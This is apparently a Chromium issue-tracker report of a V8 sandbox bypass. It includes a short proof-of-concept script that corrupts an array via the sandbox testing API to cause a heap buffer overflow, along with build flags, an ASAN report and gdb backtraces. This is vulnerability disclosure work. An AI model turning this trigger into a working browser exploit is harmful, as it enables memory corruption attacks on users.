# V8 Sandbox Bypass: Heap Buffer Overflow while Changing the Length of a Corrupted Array

| Field | Value |
|-------|-------|
| **Issue ID** | [430498032](https://issues.chromium.org/issues/430498032) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>JavaScript>Sandbox |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | da...@hirsch.cx |
| **Assignee** | bi...@chromium.org |
| **Created** | 2025-07-09 |
| **Bounty** | $5,000.00 |

## Description

Security Bug

Important: Please do not change the component of this bug manually.

Please READ THIS FAQ before filing a bug: <https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md>

Please see the following link for instructions on filing security bugs: <https://www.chromium.org/Home/chromium-security/reporting-security-bugs>

Reports may be eligible for reward payments under the Chrome VRP: <https://g.co/chrome/vrp>

NOTE: Security bugs are normally made public once a fix has been widely deployed.

---

VULNERABILITY DETAILS

During fuzzing the V8 sandbox, a heap buffer overflow was discovered.

This can be triggered by the following minimal example poc.js:

```
for (let i = 0; i<2**24; i++) {
    ~100n;
}

function f13() { ; }
new Worker(f13, { type: "function" });
const v23 = [6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926, 6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926, 6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,26843543];
const v27 = new DataView(new Sandbox.MemoryView(0, 4294967296));
v27.setInt16(Sandbox.getAddressOf(v23) + 30, 0xafc5, true);
v23.length &&= 25528;

```

This might be caused by negative values passed to `v8::internal::Heap::RightTrimArray`:

```
#23 0x0000555559164c3f in v8::internal::Heap::RightTrimArray<v8::internal::FixedDoubleArray> (this=0x7f0ff71efdb8, object=..., new_capacity=25528, old_capacity=<optimized out>) at ../../v8/src/heap/heap.cc:3618
        bytes_to_trim = -1089411552
        old_size = -1089207320
        old_end = <optimized out>
        new_end = <optimized out>
        clear_slots = <optimized out>
#24 0x0000555559c537d9 in v8::internal::(anonymous namespace)::ElementsAccessorBase<v8::internal::(anonymous namespace)::FastPackedDoubleElementsAccessor, v8::internal::(anonymous namespace)::ElementsKindTraits<(v8::internal::ElementsKind)4> >::SetLengthImpl (isolate=0x7f0ff71e1000, array=..., length=25528, backing_store=...) at ../../v8/src/objects/elements.cc:869
        old_length = 124
        capacity = <optimized out>
#25 v8::internal::(anonymous namespace)::ElementsAccessorBase<v8::internal::(anonymous namespace)::FastPackedDoubleElementsAccessor, v8::internal::(anonymous namespace)::ElementsKindTraits<(v8::internal::ElementsKind)4> >::SetLength (this=<optimized out>, isolate=<optimized out>, array=..., length=<optimized out>) at ../../v8/src/objects/elements.cc:817
No locals.
#26 0x000055555a2df2c3 in v8::internal::JSArray::SetLength (isolate=<optimized out>, array=..., new_length=<optimized out>) at ../../v8/src/objects/objects.cc:4875
No locals.
#27 0x00005555585ee288 in v8::internal::Accessors::ArrayLengthSetter (name=..., val=..., info=...) at ../../v8/src/builtins/accessors.cc:209
        rcs_timer_scope173 = <optimized out>
        length = 25528
        isolate = 0x7f0ff71e1000
        scope = {static kCheckHandleThreshold = 30720, isolate_ = 0x7f0ff71e1000, prev_next_ = 0x7e4ff71ed028, prev_limit_ = 0x7e4ff71ee8f0}
        object = {<v8::api_internal::StackAllocated<0>> = {static do_not_check = <optimized out>}, handle_ = {<v8::internal::HandleBase> = {location_ = 0x7bfff624d688}, <No data fields>}}
        array = {<v8::api_internal::StackAllocated<0>> = {static do_not_check = <optimized out>}, handle_ = {<v8::internal::HandleBase> = {location_ = 0x7bfff624d688}, <No data fields>}}
        length_obj = {<v8::api_internal::StackAllocated<0>> = {static do_not_check = <optimized out>}, handle_ = {<v8::internal::HandleBase> = {location_ = 0x7fffffffcfb0}, <No data fields>}}
        was_readonly = <optimized out>
        actual_new_len = <optimized out>

```

VERSION  

V8 version 13.9.100  

Operating System: Linux, not tested on other platforms.

REPRODUCTION CASE  

Build args:

```
is_asan = true
is_debug = false
dcheck_always_on = true
v8_symbol_level = 2
v8_static_library = true
v8_enable_sandbox = true
v8_enable_memory_corruption_api = true
v8_enable_verify_heap = true
v8_fuzzilli = true
sanitizer_coverage_flags = "trace-pc-guard"
target_cpu="x64"

```

1. Build V8 with ASAN, the sandbox, and the memory corruption API enabled.
2. Run poc.js with --sandbox-testing

Type of crash: V8 Sandbox Violation  

Crash State:  

ASAN:

```
# Ignoring debug check failure in ../../v8/src/heap/heap.cc, line 3594: new_capacity < old_capacity (25528 vs. -673021828)
# Ignoring debug check failure in ../../v8/src/heap/heap.cc, line 4222: new_size <= old_size (204232 vs. -1089207320)
# Ignoring debug check failure in ../../v8/src/heap/heap.cc, line 3306: size > 2 * kTaggedSize (-1089411552 vs. 8)
# Ignoring debug check failure in ../../v8/src/objects/free-space-inl.h, line 30: size > 2 * kTaggedSize (-1089411552 vs. 8)
# Ignoring debug check failure in ../../v8/src/heap/memory-chunk.cc, line 174: addr >= Metadata()->area_start() (134955374818184 vs. 134956464209936)
=================================================================
==91988==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7d5ff71e1788 at pc 0x555559234ca2 bp 0x7fffffffc490 sp 0x7fffffffc488
READ of size 8 at 0x7d5ff71e1788 thread T0
SCARINESS: 23 (8-byte-read-heap-buffer-overflow)
[Detaching after fork from child process 92037]
    #0 0x555559234ca1 in long std::__Cr::__cxx_atomic_load<long>(std::__Cr::__cxx_atomic_base_impl<long> const volatile*, std::__Cr::memory_order) third_party/libc++/src/include/__atomic/support/c11.h:75:10
    #1 0x555559234ca1 in std::__Cr::__atomic_base<long, false>::load(std::__Cr::memory_order) const volatile third_party/libc++/src/include/__atomic/atomic.h:66:12
    #2 0x555559234ca1 in long std::__Cr::atomic_load_explicit<long>(std::__Cr::atomic<long> const volatile*, std::__Cr::memory_order) third_party/libc++/src/include/__atomic/atomic.h:533:15
    #3 0x555559234ca1 in v8::base::Acquire_Load(long const volatile*) v8/src/base/atomicops.h:352:10
    #4 0x555559234ca1 in heap::base::BasicSlotSet<4ul>::Bucket* v8::base::AsAtomicImpl<long>::Acquire_Load<heap::base::BasicSlotSet<4ul>::Bucket*>(heap::base::BasicSlotSet<4ul>::Bucket**) v8/src/base/atomic-utils.h:81:9
    #5 0x555559234ca1 in heap::base::BasicSlotSet<4ul>::Bucket* heap::base::BasicSlotSet<4ul>::LoadBucket<(heap::base::BasicSlotSet<4ul>::AccessMode)0>(heap::base::BasicSlotSet<4ul>::Bucket**) v8/src/heap/base/basic-slot-set.h:415:14
    #6 0x555559234ca1 in heap::base::BasicSlotSet<4ul>::Bucket* heap::base::BasicSlotSet<4ul>::LoadBucket<(heap::base::BasicSlotSet<4ul>::AccessMode)0>(unsigned long) v8/src/heap/base/basic-slot-set.h:421:12
    #7 0x555559234ca1 in unsigned long heap::base::BasicSlotSet<4ul>::Iterate<(heap::base::BasicSlotSet<4ul>::AccessMode)0, unsigned long v8::internal::SlotSet::Iterate<(v8::internal::AccessMode)0, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot)>(unsigned long, unsigned long, unsigned long, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot), heap::base::BasicSlotSet<4ul>::EmptyBucketMode)::'lambda'(unsigned long), unsigned long v8::internal::SlotSet::Iterate<(v8::internal::AccessMode)0, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot)>(unsigned long, unsigned long, unsigned long, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot), heap::base::BasicSlotSet<4ul>::EmptyBucketMode)::'lambda0'(unsigned long)>(unsigned long, unsigned long, unsigned long, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot), unsigned long v8::internal::SlotSet::Iterate<(v8::internal::AccessMode)0, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot)>(unsigned long, unsigned long, unsigned long, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot), heap::base::BasicSlotSet<4ul>::EmptyBucketMode)::'lambda0'(unsigned long)) v8/src/heap/base/basic-slot-set.h:347:24
    #8 0x55555923477b in unsigned long v8::internal::SlotSet::Iterate<(v8::internal::AccessMode)0, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot)>(unsigned long, unsigned long, unsigned long, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot), heap::base::BasicSlotSet<4ul>::EmptyBucketMode) v8/src/heap/slot-set.h:154:26
    #9 0x55555923477b in v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long) v8/src/heap/remembered-set.h:80:17
    #10 0x55555919aba5 in v8::internal::RememberedSet<(v8::internal::RememberedSetType)0>::CheckNoneInRange(v8::internal::MutablePageMetadata*, unsigned long, unsigned long) v8/src/heap/remembered-set.h:155:5
    #11 0x55555919aba5 in v8::internal::Heap::VerifySlotRangeHasNoRecordedSlots(unsigned long, unsigned long) v8/src/heap/heap.cc:6608:3
    #12 0x55555919aba5 in v8::internal::(anonymous namespace)::VerifyNoNeedToClearSlots(unsigned long, unsigned long) v8/src/heap/heap.cc:3330:18
    #13 0x55555919aba5 in v8::internal::Heap::CreateFillerObjectAtRaw(v8::internal::WritableFreeSpace const&, v8::internal::ClearFreedMemoryMode, v8::internal::ClearRecordedSlots, v8::internal::Heap::VerifyNoSlotsRecorded) v8/src/heap/heap.cc:3379:5
    #14 0x555559163fc4 in v8::internal::Heap::NotifyObjectSizeChange(v8::internal::Tagged<v8::internal::HeapObject>, int, int, v8::internal::ClearRecordedSlots) v8/src/heap/heap.cc:4238:3
    #15 0x555559164c3e in void v8::internal::Heap::RightTrimArray<v8::internal::FixedDoubleArray>(v8::internal::Tagged<v8::internal::FixedDoubleArray>, int, int) v8/src/heap/heap.cc:3618:5
    #16 0x555559c537d8 in v8::internal::(anonymous namespace)::ElementsAccessorBase<v8::internal::(anonymous namespace)::FastPackedDoubleElementsAccessor, v8::internal::(anonymous namespace)::ElementsKindTraits<(v8::internal::ElementsKind)4>>::SetLengthImpl(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSArray>, unsigned int, v8::internal::DirectHandle<v8::internal::FixedArrayBase>) v8/src/objects/elements.cc:869:7
    #17 0x555559c537d8 in v8::internal::(anonymous namespace)::ElementsAccessorBase<v8::internal::(anonymous namespace)::FastPackedDoubleElementsAccessor, v8::internal::(anonymous namespace)::ElementsKindTraits<(v8::internal::ElementsKind)4>>::SetLength(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSArray>, unsigned int) v8/src/objects/elements.cc:817:12
    #18 0x55555a2df2c2 in v8::internal::JSArray::SetLength(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSArray>, unsigned int) v8/src/objects/objects.cc:4875:40
    #19 0x5555585ee287 in v8::internal::Accessors::ArrayLengthSetter(v8::Local<v8::Name>, v8::Local<v8::Value>, v8::PropertyCallbackInfo<v8::Boolean> const&) v8/src/builtins/accessors.cc:209:7
    #20 0x55555a031cbc in v8::internal::PropertyCallbackArguments::CallAccessorSetter(v8::internal::DirectHandle<v8::internal::AccessorInfo>, v8::internal::DirectHandle<v8::internal::Name>, v8::internal::DirectHandle<v8::internal::Object>) v8/src/api/api-arguments-inl.h:460:3
    #21 0x55555a2c4f2c in v8::internal::Object::SetPropertyWithAccessor(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::Maybe<v8::internal::ShouldThrow>) v8/src/objects/objects.cc:1620:24
    #22 0x55555a2d03a7 in v8::internal::Object::SetPropertyInternal(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::Maybe<v8::internal::ShouldThrow>, v8::internal::StoreOrigin, bool*) v8/src/objects/objects.cc:2371:16
    #23 0x55555a2cf8dc in v8::internal::Object::SetProperty(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::StoreOrigin, v8::Maybe<v8::internal::ShouldThrow>) v8/src/objects/objects.cc:2466:9
    #24 0x555559fe660a in v8::internal::StoreIC::Store(v8::internal::Handle<v8::internal::Union<v8::internal::Smi, v8::internal::HeapNumber, v8::internal::BigInt, v8::internal::String, v8::internal::Symbol, v8::internal::Boolean, v8::internal::Null, v8::internal::Undefined, v8::internal::JSReceiver>>, v8::internal::Handle<v8::internal::Name>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::StoreOrigin) v8/src/ic/ic.cc:1975:5
    #25 0x55555a0017b8 in v8::internal::__RT_impl_Runtime_StoreIC_Miss(v8::internal::Arguments<(v8::internal::ArgumentsType)0>, v8::internal::Isolate*) v8/src/ic/ic.cc:2968:3
    #26 0x55555a0006a8 in v8::internal::Runtime_StoreIC_Miss(int, unsigned long*, v8::internal::Isolate*) v8/src/ic/ic.cc:2940:1
    #27 0x55555f7d1abc in Builtins_CEntry_Return1_ArgvOnStack_NoBuiltinExit setup-isolate-deserialize.cc
    #28 0x55555f9a5b13 in Builtins_SetNamedPropertyHandler setup-isolate-deserialize.cc
    #29 0x55555f697862 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #30 0x55555f692ce6 in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #31 0x55555f692a2a in Builtins_JSEntry setup-isolate-deserialize.cc
    #32 0x555558d350c2 in v8::internal::GeneratedCode<unsigned long, unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**>::Call(unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**) v8/src/execution/simulator.h:212:12
    #33 0x555558d350c2 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) v8/src/execution/execution.cc:442:22
    #34 0x555558d39229 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) v8/src/execution/execution.cc:542:10
    #35 0x5555584d4578 in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) v8/src/api/api.cc:1965:7
    #36 0x555557b4eb61 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) v8/src/d8/d8.cc:1028:44
    #37 0x555557b88545 in v8::SourceGroup::Execute(v8::Isolate*) v8/src/d8/d8.cc:5077:10
    #38 0x555557b95631 in v8::Shell::RunMainIsolate(v8::Isolate*, bool) v8/src/d8/d8.cc:6029:37
    #39 0x555557b9463e in v8::Shell::RunMain(v8::Isolate*, bool) v8/src/d8/d8.cc:5937:18
    #40 0x555557b98ca8 in v8::Shell::Main(int, char**) v8/src/d8/d8.cc:6803:18
    #41 0x7ffff7ccf249  (/lib/x86_64-linux-gnu/libc.so.6+0x27249) (BuildId: 79005c16293efa45b441fed45f4f29b138557e9e)

0x7d5ff71e1788 is located 0 bytes after 520-byte region [0x7d5ff71e1580,0x7d5ff71e1788)
allocated by thread T0 here:
    #0 0x555557ad10f7 in posix_memalign /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_malloc_linux.cpp:139:3
    #1 0x555559592fd6 in v8::base::AlignedAlloc(unsigned long, unsigned long) v8/src/base/platform/memory.h:97:7
    #2 0x555559592fd6 in heap::base::BasicSlotSet<4ul>::Allocate(unsigned long) v8/src/heap/base/basic-slot-set.h:64:24
    #3 0x555559592fd6 in v8::internal::SlotSet::Allocate(unsigned long) v8/src/heap/slot-set.h:134:34
    #4 0x555559592fd6 in v8::internal::MutablePageMetadata::AllocateSlotSet(v8::internal::RememberedSetType) v8/src/heap/mutable-page-metadata.cc:145:27
    #5 0x555559155756 in void v8::internal::RememberedSet<(v8::internal::RememberedSetType)0>::Insert<(v8::internal::AccessMode)1>(v8::internal::MutablePageMetadata*, unsigned long) v8/src/heap/remembered-set.h:100:24
    #6 0x555559155756 in v8::internal::WriteBarrier::GenerationalBarrierSlow(v8::internal::Tagged<v8::internal::HeapObject>, unsigned long, v8::internal::Tagged<v8::internal::HeapObject>) v8/src/heap/heap-write-barrier.cc:377:5
    #7 0x555557bc9b84 in v8::internal::WriteBarrier::CombinedWriteBarrierInternal(v8::internal::Tagged<v8::internal::HeapObject>, v8::internal::CompressedHeapObjectSlot, v8::internal::Tagged<v8::internal::HeapObject>, v8::internal::WriteBarrierMode) v8/src/heap/heap-write-barrier-inl.h:51:7
    #8 0x55555a1e5dd4 in v8::internal::Map::SetInstanceDescriptors(v8::internal::Isolate*, v8::internal::Tagged<v8::internal::DescriptorArray>, int, v8::internal::WriteBarrierMode) v8/src/objects/map.cc:2380:3
    #9 0x55555a1e5dd4 in v8::internal::Map::InitializeDescriptors(v8::internal::Isolate*, v8::internal::Tagged<v8::internal::DescriptorArray>) v8/src/objects/map-inl.h:785:3
    #10 0x55555a1e5dd4 in v8::internal::Map::CopyReplaceDescriptors(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Map>, v8::internal::DirectHandle<v8::internal::DescriptorArray>, v8::internal::TransitionFlag, v8::internal::MaybeDirectHandle<v8::internal::Name>, char const*, v8::internal::TransitionKindFlag) v8/src/objects/map.cc:1596:15
    #11 0x55555a1cf2d6 in v8::internal::Map::CopyAddDescriptor(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Map>, v8::internal::Descriptor*, v8::internal::TransitionFlag) v8/src/objects/map.cc:2215:10
    #12 0x55555a1ceb04 in v8::internal::Map::CopyWithField(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Map>, v8::internal::DirectHandle<v8::internal::Name>, v8::internal::DirectHandle<v8::internal::FieldType>, v8::internal::PropertyAttributes, v8::internal::PropertyConstness, v8::internal::Representation, v8::internal::TransitionFlag) v8/src/objects/map.cc:545:25
    #13 0x55555a1ea8e6 in v8::internal::Map::TransitionToDataProperty(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Map>, v8::internal::DirectHandle<v8::internal::Name>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::PropertyAttributes, v8::internal::PropertyConstness, v8::internal::StoreOrigin) v8/src/objects/map.cc:2036:17
    #14 0x55555a18d7c7 in v8::internal::LookupIterator::PrepareTransitionToDataProperty(v8::internal::DirectHandle<v8::internal::JSReceiver>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::PropertyAttributes, v8::internal::StoreOrigin) v8/src/objects/lookup.cc:641:7
    #15 0x55555a2d8344 in v8::internal::Object::TransitionAndWriteDataProperty(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::PropertyAttributes, v8::Maybe<v8::internal::ShouldThrow>, v8::internal::StoreOrigin) v8/src/objects/objects.cc:2775:7
    #16 0x55555a2d6cba in v8::internal::Object::AddDataProperty(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::PropertyAttributes, v8::Maybe<v8::internal::ShouldThrow>, v8::internal::StoreOrigin, v8::internal::EnforceDefineSemantics) v8/src/objects/objects.cc:2762:10
    #17 0x55555a09ee80 in v8::internal::JSObject::DefineOwnPropertyIgnoreAttributes(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::PropertyAttributes, v8::Maybe<v8::internal::ShouldThrow>, v8::internal::JSObject::AccessorInfoHandling, v8::internal::EnforceDefineSemantics, v8::internal::StoreOrigin) v8/src/objects/js-objects.cc:3808:16
    #18 0x55555a0cb90f in T0<v8::internal::Object>::MaybeType v8::internal::JSObject::DefineOwnPropertyIgnoreAttributes<v8::internal::Object, v8::internal::DirectHandle>(v8::internal::LookupIterator*, T0<T>, v8::internal::PropertyAttributes, v8::internal::JSObject::AccessorInfoHandling, v8::internal::EnforceDefineSemantics) v8/src/objects/js-objects-inl.h:652:3
    #19 0x55555a0cb90f in v8::internal::JSObject::SetOwnPropertyIgnoreAttributes(v8::internal::DirectHandle<v8::internal::JSObject>, v8::internal::DirectHandle<v8::internal::Name>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::PropertyAttributes) v8/src/objects/js-objects.cc:3821:10
    #20 0x55555aa201c6 in v8::internal::(anonymous namespace)::CreateObjectLiteral(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::ObjectBoilerplateDescription>, int, v8::internal::AllocationType) v8/src/runtime/runtime-literals.cc:431:7
    #21 0x55555aa1b677 in v8::internal::(anonymous namespace)::ObjectLiteralHelper::Create(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, int, v8::internal::AllocationType) v8/src/runtime/runtime-literals.cc:350:12
    #22 0x55555aa1b677 in v8::internal::MaybeDirectHandle<v8::internal::JSObject> v8::internal::(anonymous namespace)::CreateLiteralWithoutAllocationSite<v8::internal::(anonymous namespace)::ObjectLiteralHelper>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, int) v8/src/runtime/runtime-literals.cc:504:30
    #23 0x55555aa16630 in v8::internal::MaybeDirectHandle<v8::internal::JSObject> v8::internal::(anonymous namespace)::CreateLiteral<v8::internal::(anonymous namespace)::ObjectLiteralHelper>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, int, v8::internal::Handle<v8::internal::HeapObject>, int) v8/src/runtime/runtime-literals.cc
    #24 0x55555aa16630 in v8::internal::__RT_impl_Runtime_CreateObjectLiteral(v8::internal::Arguments<(v8::internal::ArgumentsType)0>, v8::internal::Isolate*) v8/src/runtime/runtime-literals.cc:577:3
    #25 0x55555aa158e8 in v8::internal::Runtime_CreateObjectLiteral(int, unsigned long*, v8::internal::Isolate*) v8/src/runtime/runtime-literals.cc:569:1
    #26 0x55555f7d1abc in Builtins_CEntry_Return1_ArgvOnStack_NoBuiltinExit setup-isolate-deserialize.cc
    #27 0x5555bf640bf2  (<unknown module>)
    #28 0x55555f692ce6 in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #29 0x55555f692a2a in Builtins_JSEntry setup-isolate-deserialize.cc
    #30 0x555558d350c2 in v8::internal::GeneratedCode<unsigned long, unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**>::Call(unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**) v8/src/execution/simulator.h:212:12
    #31 0x555558d350c2 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) v8/src/execution/execution.cc:442:22
    #32 0x555558d39229 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) v8/src/execution/execution.cc:542:10
    #33 0x5555584d4578 in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) v8/src/api/api.cc:1965:7
    #34 0x555557b4eb61 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) v8/src/d8/d8.cc:1028:44
    #35 0x555557b88545 in v8::SourceGroup::Execute(v8::Isolate*) v8/src/d8/d8.cc:5077:10
    #36 0x555557b95631 in v8::Shell::RunMainIsolate(v8::Isolate*, bool) v8/src/d8/d8.cc:6029:37
    #37 0x555557b9463e in v8::Shell::RunMain(v8::Isolate*, bool) v8/src/d8/d8.cc:5937:18
    #38 0x555557b98ca8 in v8::Shell::Main(int, char**) v8/src/d8/d8.cc:6803:18
    #39 0x7ffff7ccf249  (/lib/x86_64-linux-gnu/libc.so.6+0x27249) (BuildId: 79005c16293efa45b441fed45f4f29b138557e9e)

SUMMARY: AddressSanitizer: heap-buffer-overflow third_party/libc++/src/include/__atomic/support/c11.h:75:10 in long std::__Cr::__cxx_atomic_load<long>(std::__Cr::__cxx_atomic_base_impl<long> const volatile*, std::__Cr::memory_order)
Shadow bytes around the buggy address:
  0x7d5ff71e1500: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7d5ff71e1580: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7d5ff71e1600: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7d5ff71e1680: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7d5ff71e1700: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x7d5ff71e1780: 00[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7d5ff71e1800: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7d5ff71e1880: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7d5ff71e1900: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7d5ff71e1980: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7d5ff71e1a00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==91988==ABORTING

## V8 sandbox violation detected!

```

gdb backtrace:

```
+bt full
#0  0x00007ffff7d32eec in ?? () from /lib/x86_64-linux-gnu/libc.so.6
No symbol table info available.
#1  0x00007ffff7ce3fb2 in raise () from /lib/x86_64-linux-gnu/libc.so.6
No symbol table info available.
#2  0x00007ffff7cce472 in abort () from /lib/x86_64-linux-gnu/libc.so.6
No symbol table info available.
#3  0x0000555557af0bdc in Abort () at /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/sanitizer_common/sanitizer_posix_libcdep.cpp:163
No locals.
#4  0x0000555557aef35e in __sanitizer::Die() () at /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/sanitizer_common/sanitizer_termination.cpp:58
No locals.
#5  0x0000555557ad6b7b in ~ScopedInErrorReport () at /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_report.cpp:221
No locals.
#6  0x0000555557ad895d in ReportGenericError () at /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_report.cpp:536
No locals.
#7  0x0000555557ad9756 in __asan_report_load8 () at /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_rtl.cpp:131
No locals.
#8  0x0000555559234ca2 in std::__Cr::__cxx_atomic_load<long> (__a=0x16754, __order=std::__Cr::memory_order::acquire) at ../../third_party/libc++/src/include/__atomic/support/c11.h:75
No locals.
#9  std::__Cr::__atomic_base<long, false>::load (this=0x16754, __m=std::__Cr::memory_order::acquire) at ../../third_party/libc++/src/include/__atomic/atomic.h:66
No locals.
#10 std::__Cr::atomic_load_explicit<long> (__o=0x16754, __m=std::__Cr::memory_order::acquire) at ../../third_party/libc++/src/include/__atomic/atomic.h:533
No locals.
#11 v8::base::Acquire_Load (ptr=0x16754) at ../../v8/src/base/atomicops.h:352
No locals.
#12 v8::base::AsAtomicImpl<long>::Acquire_Load<heap::base::BasicSlotSet<4ul>::Bucket*> (addr=0x16754) at ../../v8/src/base/atomic-utils.h:81
No locals.
#13 heap::base::BasicSlotSet<4ul>::LoadBucket<(heap::base::BasicSlotSet<4ul>::AccessMode)0> (this=0x7d5ff71e1588, bucket=0x16754) at ../../v8/src/heap/base/basic-slot-set.h:415
No locals.
#14 heap::base::BasicSlotSet<4ul>::LoadBucket<(heap::base::BasicSlotSet<4ul>::AccessMode)0> (this=0x7d5ff71e1588, bucket_index=64) at ../../v8/src/heap/base/basic-slot-set.h:421
No locals.
